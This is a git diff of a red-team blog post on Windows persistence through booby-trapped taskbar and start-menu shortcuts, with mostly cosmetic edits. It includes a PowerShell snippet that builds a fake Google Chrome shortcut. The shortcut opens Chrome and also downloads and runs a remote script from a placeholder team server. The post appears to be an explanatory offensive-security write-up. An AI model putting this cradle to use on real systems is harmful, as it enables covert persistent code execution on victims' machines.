@@ -2,12 +2,12 @@
 layout: post
 title: Sticky LNKz
 date: 2017-08-15
-excerpt: "A User-Drive persistence post using common taskbar and startmenu shortcuts"
+excerpt: "A post about User-Driven persistence using common taskbar and startmenu shortcuts"
 tags: [persistence, redteam, cradles, payloads]
 comments: false
 ---
 # Intro
-As a user in a corporate environment, what is one of the first things you do? After you get some coffee and have a chat with your co-workers about the latest news or some semi-personal event from the night before.. you log in. A good blue team will be looking to make sure when you log in there isn't some type of malware set up with persistence to run before you even hear that catchy windows logon tune. With programs like "autoruns https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" and well crafted detection methods from just about every security vendor, it is very likely a redteamer will get caught trying to drop persistence in the known and obvious locations.
+As a user in a corporate environment, what is one of the first things you do? After you get some coffee and have a chat with your co-workers about the latest news or some semi-personal event from the night before.. you log in. A good blue team will be looking to make sure when you log in there isn't some type of malware set up with persistence to run before you even hear that catchy windows logon tune. With programs like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns" title="autoruns">autoruns</a> and well crafted detection methods from just about every security vendor, it is very likely a redteamer will get caught trying to drop persistence in the known and obvious locations.
 
 ## User-Drive Persistence
 I've seen several different methods of persistence that redteamers (and blackhats) often use to repop a shell on a device that gets shutdown everyday and rebooted the next morning. Senspost's @_staaldraad has a handy tool I was introduced to at Blackhat called "Outlook Ruler". The original concept was once you had credz you could set up an outlook rule to pop a shell whenever needed by sending a triggered email that would delete itself and run a payload via an external webdev share. Genius! Subj: "bSpence love his shells"
@@ -25,7 +25,7 @@ The epiphany I had was that users often customize their user experience by creat
 
 ## The Payload
 Credit to @enigma0x3 for the original powershell LNK generation, but I've added a few things to retrofit this script for taskbar/startmenu usage. In the example below we will be using Google Chrome as a shortcut. Keep in mind this is post-exploitation work to establish User-Based Persistence.
-{% highlight css %}
+{% highlight html %}
 $LNKName = "C:\Users\<YOUR_USER>\Desktop\Google Chrome.lnk"
 $BinaryPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 $Arguments = "-nop -c `Start-Process chrome.exe; `$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('http://TEAMSERVER:80/URI'))"
